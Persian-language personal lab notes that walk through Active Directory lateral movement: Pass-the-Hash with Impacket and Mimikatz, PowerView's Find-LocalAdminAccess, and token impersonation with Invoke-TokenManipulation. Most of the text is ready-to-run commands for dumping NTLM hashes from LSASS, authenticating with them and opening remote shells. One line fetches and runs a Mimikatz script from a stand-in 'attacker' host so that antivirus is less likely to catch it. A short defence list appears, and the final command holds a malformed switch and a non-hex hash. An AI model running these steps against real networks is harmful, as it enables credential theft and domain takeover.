
---

## **Pass-the-Hash (PtH) چیست؟**

در ویندوز (و به‌خصوص در اکتیو دایرکتوری)، وقتی یک کاربر لاگین می‌کند، رمز عبور به صورت **هش (معمولاً NTLM Hash)** در حافظه ذخیره می‌شود تا سیستم بتواند بدون وارد کردن مجدد پسورد، کاربر را احراز هویت کند.  
حمله **Pass-the-Hash** این را هدف می‌گیرد:  
به‌جای داشتن **رمز عبور واقعی**، مهاجم **هش NTLM** را می‌گیرد و مستقیماً برای احراز هویت در سیستم‌های دیگر استفاده می‌کند.

یعنی:

> نیازی به دانستن پسورد نیست؛ داشتن هش کافی است تا مثل صاحب حساب وارد شوید.

---

## **چطور کار می‌کند؟**

1. **به‌دست آوردن هش‌ها**
    
    - مهاجم پس از دسترسی اولیه (مثلاً روی یک ماشین عضو دامین)، هش‌های NTLM را از حافظه (LSASS) یا SAM استخراج می‌کند.
        
    - ابزارهای متداول:
        
        - `Mimikatz` → دستور: `sekurlsa::logonpasswords`
            
        - `Impacket (secretsdump.py)`
            
        - `LSA Secrets` یا `NTDS.dit`
            
2. **استفاده از هش‌ها برای لاگین**
    
    - حالا مهاجم با هش‌ها، بدون نیاز به پسورد واقعی، روی ماشین‌های دیگر احراز هویت می‌کند.
        
    - این کار با ابزارهایی مثل:
        
        - `psexec.py` (از مجموعه Impacket)
            
        - `wmiexec.py` (اجرای دستورات از راه دور)
            
        - `Mimikatz` → دستور: `sekurlsa::pth`
            
3. **حرکت جانبی (Lateral Movement)**
    
    - با این هش‌ها، مهاجم به سرورهای دیگر (به‌خصوص **Domain Controller** یا سرورهای مهم) متصل می‌شود.
        
    - در این مرحله معمولاً مهاجم اکانت‌های با سطح دسترسی بالا مثل **Domain Admin** را هدف قرار می‌دهد.
        

---

## **چرا این حمله جواب می‌دهد؟**

- **NTLM** در ویندوز **Challenge-Response** است: برای احراز هویت نیازی به پسورد اصلی نیست؛ هش کافی است.
    
- **رمز عبور و هش NTLM تقریباً معادل هستند** (هرکسی هش را داشته باشد، می‌تواند به‌عنوان آن کاربر لاگین کند).
    
- **ضعف در مدیریت حساب‌های Admin محلی**: معمولاً همان پسورد (و درنتیجه همان هش) روی چند سیستم تکرار می‌شود.
    

---

## **در اکتیو دایرکتوری (AD Lateral Movement)**

در محیط‌های دامین، این حمله بسیار خطرناک است:

- اگر مهاجم هش اکانت **Domain Admin** را پیدا کند → می‌تواند مستقیماً وارد **DC** شود.
    
- حتی با اکانت‌های سطح پایین، می‌تواند به سراغ سیستم‌های دیگر برود و دامنه نفوذش را گسترش دهد.
    

**معمولاً سناریو این‌طوری است:**

1. دسترسی به یک Workstation عادی
    
2. استخراج هش اکانت‌های کش‌شده (Cached)
    
3. استفاده از هش‌ها برای لاگین روی سرورهای حساس (File Server, SQL Server)
    
4. پیدا کردن هش یا Credentialهای Domain Admin
    
5. نفوذ به Domain Controller
    

---

## **ابزارهای رایج**

- **Mimikatz** → استخراج و Pass-the-Hash
    
- **Impacket** (psexec.py, wmiexec.py, smbexec.py) → اجرای ریموت با هش
    
- **CrackMapExec** → تست همزمان چندین ماشین با هش
    
- **Evil-WinRM** → اتصال به WinRM با هش
    

---

## **مثال عملی (Impacket)**

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 Administrator@10.0.0.5
```

این دستور با هش NTLM اکانت ادمین، یک شل روی ماشین مقصد می‌دهد.

---

## **روش‌های دفاع (Detection & Mitigation)**

1. **غیرفعال‌سازی NTLM (تا جای ممکن)** و استفاده از Kerberos.
    
2. **LSA Protection** برای جلوگیری از Dump کردن LSASS.
    
3. **Credential Guard** در ویندوز 10 و سرور 2016 به بعد.
    
4. **استفاده از اکانت‌های Local Admin منحصر به‌فرد** (با LAPS).
    
5. **مانیتورینگ لاگ‌های 4624 (Type 3)** برای ورودهای مشکوک با NTLM.
    

---

---

## **find-localadminaccess چی کار می‌کنه؟**

این دستور یکی از توابع مهم ماژول **PowerView** (بخشی از PowerSploit) هست که برای **شناسایی سیستم‌هایی که کاربر فعلی روی آن‌ها دسترسی Local Administrator داره** استفاده می‌شه.

به زبان ساده:

> بهت نشون می‌ده با همین اکانتی که داری، روی کدوم کامپیوترهای دامین می‌تونی لاگین ادمینی بگیری.

---

## **چرا مهمه؟**

بعد از اینکه مهاجم با **Pass-the-Hash** یا هر روش دیگه‌ای **یک Credential (هش یا پسورد)** به دست آورد، باید بدونه:

- این اکانت روی چه سیستم‌هایی **دسترسی ادمین** داره؟
    
- کجا می‌تونه **Remote Execution** انجام بده؟
    

**find-localadminaccess** این کار رو به صورت خودکار انجام می‌ده.

---

## **چطور استفاده می‌شه؟**

این دستور رو باید در PowerShell و با ماژول PowerView اجرا کنی:

```powershell
Import-Module .\PowerView.ps1
Find-LocalAdminAccess
```

وقتی اجرا بشه:

- کل کامپیوترهای دامین رو (از طریق LDAP) لیست می‌کنه.
    
- تلاش می‌کنه با کاربر فعلی روی هرکدوم ارتباط بگیره.
    
- اگر موفق بشه → یعنی این کاربر روی اون سیستم Local Admin هست.
    

**خروجی:** لیستی از ماشین‌ها که توی اون‌ها Local Admin داری.

---

## **ترکیب با Pass-the-Hash**

خیلی وقت‌ها مهاجم این رو با Pass-the-Hash استفاده می‌کنه:

1. با **Mimikatz** هش NTLM اکانت رو می‌گیره.
    
2. با `sekurlsa::pth` وارد می‌شه.
    
3. با `Find-LocalAdminAccess` می‌فهمه کجا می‌تونه بره.
    
4. با `Invoke-Command`، `PsExec` یا `wmiexec.py` حرکت جانبی می‌کنه.
    

---

## **مثال واقعی:**

```powershell
Import-Module .\PowerView.ps1
Find-LocalAdminAccess -Verbose
```

خروجی چیزی شبیه این می‌شه:

```
ComputerName    Accessible
------------    ----------
PC-01           True
PC-02           True
```

یعنی روی این سیستم‌ها دسترسی ادمین داری و می‌تونی حمله بعدی رو انجام بدی.

---

### **خلاصه:**

- **کارش:** پیدا کردن سیستم‌هایی که کاربر فعلی Local Admin داره.
    
- **کاربرد:** برای **Lateral Movement** بعد از به‌دست آوردن هش/پسورد.
    
- **ابزار:** PowerView (PowerSploit).
    


![[Screenshot 2025-07-23 155418.png]]


---

پس در قدم اول ما میایم و با استفاده از powerview برسی میکنیم که به چه جاهایی میتونیم دسترسی بگیریم 
با استفاده از  تابع find-localadminaccess

در قدم میتونیم با استفاده از دستور 
```
Enter-PSsession main.charon.local
```


بیایم و شل دامین مربوطه رو بگیریم 

===============================================================


---

## **دستور `Invoke-TokenManipulation -Enumerate` چی کار می‌کنه؟**

این دستور از ماژول **Token Manipulation** (توی PowerView/PowerSploit) استفاده می‌کنه تا **توکن‌های امنیتی (Security Tokens)** موجود در سیستم رو لیست کنه.

به زبان ساده:

> **می‌گه چه توکن‌هایی (کاربران/پردازش‌ها) روی این سیستم بارگذاری شدن و شما می‌تونید ازشون استفاده کنید (Impersonation/Privilege Escalation).**

---

## **توکن امنیتی (Security Token) یعنی چی؟**

وقتی یک کاربر توی ویندوز لاگین می‌کنه یا یک پردازش اجرا می‌شه، سیستم براش یک **توکن امنیتی** می‌سازه که شامل:

- **کاربر** (SID)
    
- **گروه‌ها** (Groups)
    
- **سطح دسترسی‌ها (Privileges)**
    

این توکن‌ها توسط پردازش‌ها استفاده می‌شن و اگر دسترسی داشته باشی، می‌تونی **خودت رو به جای اون کاربر جا بزنی (Impersonate)**.

---

## **چرا این مهمه برای مهاجم؟**

تو سناریوی **Privilege Escalation** و **Lateral Movement**، اگر مهاجم بتونه به توکن یک کاربر با دسترسی بالاتر (مثلاً Domain Admin) دسترسی پیدا کنه، می‌تونه بدون داشتن پسورد یا هش:

- به جای اون کاربر رفتار کنه (Impersonate).
    
- به منابع و سرورهای دیگه وصل بشه.
    

این دقیقاً بخشی از تکنیک **Token Impersonation** هست که در Red Teaming خیلی استفاده می‌شه.

---

## **خروجی این دستور چی نشون می‌ده؟**

وقتی اجراش کنی:

```powershell
Invoke-TokenManipulation -Enumerate
```

لیستی از **توکن‌های موجود** رو نشون می‌ده مثل:

- PID (شناسه پردازش)
    
- نوع توکن (Primary/Impersonation)
    
- سطح Impersonation (Delegate, Impersonate, Anonymous)
    
- کاربری که توکن متعلق بهشه
    

مثال خروجی:

```
Name          : WINLOGON
PID           : 500
User          : LAB\Administrator
Impersonation : Impersonation
Privileges    : SeDebugPrivilege, SeTcbPrivilege
```

این یعنی یک توکن از کاربر **Administrator** روی پردازش **WINLOGON** هست و اگر بتونی Impersonate کنی، می‌تونی همون دسترسی رو بگیری.

---

## **بعدش چی؟**

بعد از Enumerate کردن توکن‌ها، می‌تونی:

- با همون ماژول توکن رو **Duplicate و Impersonate** کنی:
    
    ```powershell
    Invoke-TokenManipulation -Impersonate -Username "LAB\Administrator"
    ```
    
- یا حتی **یک پروسه جدید با اون توکن** بسازی (Privilege Escalation).
    

---

## **جمع‌بندی**

- `Invoke-TokenManipulation -Enumerate` → لیست توکن‌های امنیتی موجود.
    
- **کاربرد:** پیدا کردن توکن‌های ارزشمند (مثلاً توکن Domain Admin).
    
- **مرحله بعد:** استفاده از اون توکن‌ها برای **Privilege Escalation** یا **Lateral Movement**.
    

---

میتونیم بعد از این فرایند برای ابزار های ماننده mimikatz  رو سیستم نصب مورد نظر نصب کنیم تا در مراحل بعدی بیایم و هش های یوزر های  مختلف رو دامپ کنیم 

--------------------------------------------------------------------------

---

## **دستور `Invoke-TokenManipulation -Impersonate` چی کار می‌کنه؟**

این دستور بهت اجازه می‌ده **توکن امنیتی یک کاربر دیگه** (که روی سیستم لود شده) رو **Impersonate (جعل هویت)** کنی.  
یعنی بدون داشتن پسورد یا هش، خودتو جای اون کاربر جا بزنی و با سطح دسترسی اون کاربر عمل کنی.

به زبان ساده:

> **تو همون لحظه می‌شی همون کاربر (مثلاً Domain Admin) و می‌تونی با همون دسترسی کار کنی.**

---

## **این چطور ممکنه؟**

وقتی کاربرها توی ویندوز لاگین می‌کنن یا سرویس‌ها اجرا می‌شن، توکن‌های امنیتی (Security Tokens) توی حافظه ساخته می‌شن.  
اگر اکانت فعلی توی گروه **Administrators** باشه (یا دسترسی SeImpersonatePrivilege داشته باشه)، می‌تونی به اون توکن‌ها دسترسی بگیری و خودتو Impersonate کنی.

این دقیقاً شبیه تکنیک‌های **Token Impersonation** و **Access Token Theft** در حملات Red Team هست.

---

## **دستور چطور استفاده می‌شه؟**

### **قدم ۱: دیدن توکن‌ها**

اول باید ببینی چه توکن‌هایی در دسترس هستن:

```powershell
Invoke-TokenManipulation -Enumerate
```

### **قدم ۲: Impersonate کردن یک توکن**

حالا یکی از توکن‌های با ارزش (مثلاً ادمین دامین) رو Impersonate می‌کنی:

```powershell
Invoke-TokenManipulation -Impersonate -Username "LAB\Administrator"
```

یا اگر PID توکن رو داری:

```powershell
Invoke-TokenManipulation -Impersonate -ProcessId 1234
```

بعد از این دستور، **سشن فعلی پاورشل شما با سطح دسترسی همون کاربر جدید اجرا می‌شه**.

---

## **چه فایده‌ای داره؟**

- **Privilege Escalation:** اگر توکن کاربر Local Admin یا Domain Admin رو بگیری، دسترسی تو فوراً ارتقا پیدا می‌کنه.
    
- **Lateral Movement:** می‌تونی با همون دسترسی روی سیستم‌های دیگه لاگین کنی (مثلاً از طریق `Invoke-Command`, `PsExec`, `wmiexec`).
    
- **Pass-the-Token:** بدون داشتن پسورد یا هش، با توکن فعلی کاربر به منابع شبکه دسترسی پیدا می‌کنی.
    

---

## **مثال عملی**

فرض کن روی یک سرور نشست گرفتی و ادمین دامین هم قبلاً لاگین کرده.

1. با این دستور می‌بینی چه توکن‌هایی وجود داره:
    
    ```powershell
    Invoke-TokenManipulation -Enumerate
    ```
    
2. توکن Domain Admin رو Impersonate می‌کنی:
    
    ```powershell
    Invoke-TokenManipulation -Impersonate -Username "LAB\Administrator"
    ```
    
3. حالا بدون داشتن پسورد می‌تونی به Domain Controller وصل بشی:
    
    ```powershell
    Enter-PSSession -ComputerName DC01
    ```
    

---

## **نکات مهم امنیتی**

- این تکنیک نیازمند **دسترسی ادمین محلی** روی سیستم فعلی هست.
    
- برای جلوگیری:
    
    - **Credential Guard** رو فعال کن.
        
    - **LSA Protection** رو روشن کن.
        
    - لاگ‌ها رو مانیتور کن (Event ID 4624 و 4648 برای Impersonation).
        

---

### **خلاصه:**

- `-Enumerate` → نشون می‌ده چه توکن‌هایی داری.
    
- `-Impersonate` → همون لحظه توکن رو جعل می‌کنه و دسترسی‌تو ارتقا می‌ده.
    
- کاربرد اصلی: **Privilege Escalation** و **Lateral Movement بدون پسورد.**
    

---























---

## **مراحل انجام Pass-the-Hash با Mimikatz**

### **1. اجرای Mimikatz با دسترسی ادمین**

Mimikatz باید با **Run as Administrator** و ترجیحاً روی سیستم قربانی (یا با ادمین دامین) اجرا بشه:

```cmd
mimikatz.exe
```

یا داخل PowerShell:

```powershell
.\mimikatz.exe
```

---

### **2. فعال کردن Debugging**

قبل از هر کاری این رو فعال می‌کنیم:

```mimikatz
privilege::debug
```

اگر موفق بود → پیام `Privilege '20' OK` می‌گیریم.

---

### **3. استخراج هش‌ها (NTLM)**

حالا هش NTLM کاربرانی که روی سیستم لاگین کردن رو می‌کشیم:

```mimikatz
sekurlsa::logonpasswords
```

در خروجی دنبال این قسمت بگرد:

```
Username : Administrator
Domain   : LAB
NTLM     : 5f4dcc3b5aa765d61d8327deb882cf99
```

این همون هش NTLM کاربره که نیاز داریم.

> **نکته:** اگر دسترسی به LSASS قفل بود، باید Mimikatz رو با `psexec` یا **Dump LSASS** (مثل ProcDump) اجرا کنیم.

---

### **4. اجرای حمله Pass-the-Hash**

حالا بدون داشتن پسورد، با همون هش لاگین می‌کنیم. اینجا از دستور **sekurlsa::pth** استفاده می‌کنیم:

```mimikatz
sekurlsa::pth /user:Administrator /domain:LAB /ntlm:5f4dcc3b5aa765d61d8327deb882cf99 /run:cmd.exe
```

این دستور:

- کاربر رو مشخص می‌کنه (`/user:Administrator`)
    
- دامین رو مشخص می‌کنه (`/domain:LAB`)
    
- هش NTLM رو می‌ذاره (`/ntlm:HASH`)
    
- یه پروسه جدید با این اعتبار اجرا می‌کنه (مثلاً `cmd.exe`).
    

وقتی این دستور اجرا شد، **یه Command Prompt جدید باز میشه که با همون هش احراز هویت شده**.

---

### **5. حرکت جانبی (Lateral Movement)**

حالا با این دسترسی می‌تونی روی سیستم‌های دیگه توی دامین وصل بشی:

```cmd
dir \\10.0.0.5\c$
psexec \\10.0.0.5 cmd
```

اگر کاربر لوکال ادمین روی مقصد باشه → وارد می‌شی.

---

## **نکات مهم**

- **حساب‌های Local Admin تکراری** روی چند سیستم → بهترین هدف برای PtH.
    
- اگر **Credential Guard** یا **LSA Protection** فعال باشه، این حمله سخت‌تر می‌شه.
    
- این حمله خیلی **ردپا می‌ذاره**: لاگ 4624 (Logon Type 3 و 9) در Event Viewer.
    

---

## **جمع‌بندی**

- `sekurlsa::logonpasswords` → گرفتن هش‌ها
    
- `sekurlsa::pth` → اجرای Pass-the-Hash
    
- بعدش می‌تونی با ابزارهای مثل `psexec`، `wmiexec`، `smb` روی سرورهای دیگه حرکت کنی.
    

---

---

## **قدم اول: اجرای PowerShell با دسترسی ادمین**

برای دسترسی به LSASS و اجرای PTH، پاورشل باید **با Run as Administrator** باز بشه.

---

## **قدم دوم: اجرای Mimikatz داخل PowerShell**

دو حالت داریم:

### **روش ۱ – اجرای باینری Mimikatz**

```powershell
.\mimikatz.exe
```

### **روش ۲ – اجرای Mimikatz به‌صورت Reflective داخل پاورشل** (ضد آنتی‌ویروس راحت‌تر):

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/mimikatz.ps1')
Invoke-Mimikatz
```

(در لابراتوار تستی یا شبکه قرنطینه استفاده کن.)

---

## **قدم سوم: فعال کردن دسترسی Debug**

```mimikatz
privilege::debug
```

اگر موفق باشه → پیام `Privilege '20' OK` رو می‌بینی.

---

## **قدم چهارم: گرفتن هش NTLM**

```mimikatz
sekurlsa::logonpasswords
```

حالا توی خروجی دنبال **NTLM Hash** برای کاربر هدف بگرد:

```
Username : Administrator
Domain   : LAB
NTLM     : 5f4dcc3b5aa765d61d8327deb882cf99
```

---

## **قدم پنجم: اجرای Pass-the-Hash**

حالا با همین هش، یک پروسه (مثلاً CMD) رو با اعتبار کاربر اجرا می‌کنیم:

```mimikatz
sekurlsa::pth /user:Administrator /domain:LAB /ntlm:5f4dcc3b5aa765d61d8327deb882cf99 /run:powershell.exe
```

این دستور:

- `/user:` → نام کاربر (مثلاً Administrator)
    
- `/domain:` → دامین یا سیستم
    
- `/ntlm:` → هش NTLM
    
- `/run:` → برنامه‌ای که با این اعتبار باز بشه (اینجا پاورشل جدید)
    

**نتیجه:**  
یه پنجره PowerShell جدید باز می‌شه که **با توکن ادمین (و بدون نیاز به پسورد واقعی)** اجرا شده.

---

## **قدم ششم: حرکت جانبی (Lateral Movement)**

حالا از همین سشن می‌تونی به ماشین‌های دیگه وصل بشی:

```powershell
Enter-PSSession -ComputerName DC01
```

یا حتی:

```powershell
Invoke-Command -ComputerName Server01 -ScriptBlock { whoami }
```

اگر کاربر ادمین روی اون ماشین باشه → بدون پسورد لاگین می‌کنی.

---

## **نکته‌ها:**

- این تکنیک روی **NTLM فعال** جواب می‌ده (نه Kerberos-only).
    
- اگر **Credential Guard یا LSA Protection** فعال باشه، Dump کردن LSASS سخت‌تر می‌شه.
    
- توی لاگ ویندوز این به‌صورت **Logon Type 9 (NewCredentials)** و **4624** ثبت می‌شه.
    

---

### **جمع‌بندی:**

1. **گرفتن هش با `sekurlsa::logonpasswords`**
    
2. **اجرای `sekurlsa::pth` با اون هش**
    
3. **باز کردن یک شل جدید و حرکت به سیستم‌های دیگه**
    

---


```
invoke-mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
```

### 1. `privilege::debug`

- **کارش:** این دستور **Privilege لازم برای دسترسی به حافظه پردازش‌های حساس** (مثل LSASS) رو فعال می‌کنه.
    
- معمولاً دسترسی دیفالت تو ویندوز به این سطح نیست، باید با اکانتی اجرا بشه که بتونه این پرایولیج رو بگیره.
    
- اگر موفق باشه پیام میده:

---

### 2. `token::elevate`

- **کارش:** این دستور سعی می‌کنه **توکن (Access Token) پروسه جاری رو ارتقا بده**.
    
- یعنی اگر توکن تو دسترسی‌های محدود یا معمولی هست، می‌خواد اون رو به توکن با سطح دسترسی بالاتر (مثلاً SYSTEM یا ادمین) تبدیل کنه.
    
- در واقع به Mimikatz اجازه میده با دسترسی بالاتر عمل کنه تا بتونه داده‌های حساس رو بخونه.
    
- این دستور معمولاً **قبل از کار با توکن‌ها** یا دسترسی به LSASS استفاده میشه.

## **چرا با هم استفاده میشن؟**

- اول `privilege::debug` میگه: "اجازه بده من به حافظه دسترسی داشته باشم."
    
- بعد `token::elevate` میگه: "دسترسی‌مو بیشتر کن تا بتونم اطلاعات لازم رو بردارم."
    
- آخر `sekurlsa::logonpasswords` اطلاعات لاگین رو استخراج می‌کنه.
    

---
## **جمع‌بندی**

این دستور مجموعه‌ای از دستورات Mimikatz هست که:

- دسترسی لازم رو فعال می‌کنه
    
- خودش رو با دسترسی بالا می‌بره
    
- و بعد لاگین‌پسورد و هش‌ها رو از حافظه می‌گیره



```
	invoke-mimikatz -command '"sekurlsa::pth/usr:administrator /domain:charon.local /ntlm:23534t32l4t3k4b5k34knfvfb /run:powershell.exe"'
```

حلا با استفاده از این دستور میایم با استفاده از اون هش و اکانت و دامین دسترسی که میخواهیم میگیریم به صورت شل از طریق پاورشل
